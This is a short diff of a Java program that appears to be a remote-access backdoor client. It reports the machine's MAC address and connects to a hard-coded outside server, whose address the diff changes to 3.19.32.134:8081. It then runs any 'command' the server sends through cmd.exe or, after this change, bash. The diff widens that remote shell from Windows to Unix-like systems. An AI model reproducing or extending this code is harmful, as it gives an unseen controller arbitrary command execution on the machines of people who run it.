@@ -27,13 +27,17 @@ public class Main {
 
         System.out.println(SocketHandler.getMACAddress());
 
-        SocketHandler socketHandler = SocketHandler.connect("3.89.196.174", 8080);
+        SocketHandler socketHandler = SocketHandler.connect("3.19.32.134", 8081);
         socketHandler.setOnDataListener(data -> {
             int id = data.getId();
             if (data.getType().equals("command")) {
                 String command = ((String) data.getMap().get("command")).replaceAll("\"", "^\"");
                 ProcessBuilder processBuilder = new ProcessBuilder();
-                processBuilder.command("cmd.exe", "/c", "\"" + command + "\"");
+                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+                    processBuilder.command("cmd.exe", "/c", command);
+                } else {
+                    processBuilder.command("bash", "-c", command);
+                }
                 new Thread(() -> {
                     try {
                         Process process = processBuilder.start();
@@ -244,7 +248,9 @@ public class Main {
     }
     private static boolean checkInternetConnection() {
         try {
-            Process process = java.lang.Runtime.getRuntime().exec("ping www.geeksforgeeks.org");
+            String command = System.getProperty("os.name").toLowerCase().contains("windows") ?
+                    "ping google.com": "ping -c 1 google.com";
+            Process process = java.lang.Runtime.getRuntime().exec(command);
             return process.waitFor() == 0;
         } catch (Exception e) {
             return false;
